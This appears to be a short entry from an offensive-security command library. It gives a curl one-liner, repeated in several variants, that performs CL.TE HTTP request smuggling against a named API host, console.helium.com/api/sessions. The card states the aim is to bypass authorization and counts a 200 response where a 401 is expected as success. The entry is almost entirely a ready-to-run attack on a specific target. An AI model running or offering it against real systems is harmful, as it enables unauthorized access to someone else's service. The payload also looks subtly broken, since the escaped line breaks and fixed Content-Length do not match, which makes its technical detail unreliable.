---
data: >-
  curl -X POST -H 'Host: console.helium.com' -H 'Content-Length: 109' -H
  'Transfer-Encoding: chunked' --data '0\r\n\r\nGET / HTTP/1.1\r\nHost:
  console.helium.com\r\n\r\n' https://console.helium.com/api/sessions
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: b65f65af-a77b-4f80-95ea-63708cadab98
created_at: '2025-12-13T09:01:26.080Z'
updated_at: '2025-12-13T09:01:26.080Z'
verified: false
validated: true
submitted: true
---
# Send Smuggled HTTP Request

## Command

```bash
curl -X POST -H 'Host: console.helium.com' -H 'Content-Length: 109' -H 'Transfer-Encoding: chunked' --data '0\r\n\r\nGET / HTTP/1.1\r\nHost: console.helium.com\r\n\r\n' https://console.helium.com/api/sessions
```

## Description

This command sends a malformed POST request exploiting CL.TE HTTP Request Smuggling by including a smuggled GET request in chunked data, used to bypass authorization on the target API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Content-Length: 109'` | Sets Content-Length for front-end parsing | Yes |
| `-H 'Transfer-Encoding: chunked'` | Enables chunked encoding for back-end | Yes |
| `--data` | Includes the chunked data with smuggled GET request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H 'Host: console.helium.com' -H 'Content-Length: 109' -H 'Transfer-Encoding: chunked' --data '0\r\n\r\nGET / HTTP/1.1\r\nHost: console.helium.com\r\n\r\n' https://console.helium.com/api/sessions
```

### Advanced Usage

```bash
curl -X POST -H 'Host: console.helium.com' -H 'Content-Length: 109' -H 'Transfer-Encoding: chunked' -H 'User-Agent: Custom' --data '0\r\n\r\nGET / HTTP/1.1\r\nHost: console.helium.com\r\n\r\n' https://console.helium.com/api/sessions
```

## Expected Output

A 200 OK response indicating successful smuggling, instead of 401 Unauthorized.

## Related

- [[procedures/Exploit-CL-TE-HTTP-Request-Smuggling-Using-Burp-Suite]]
- [[tools/Burp-Suite-Turbo-Intruder]]
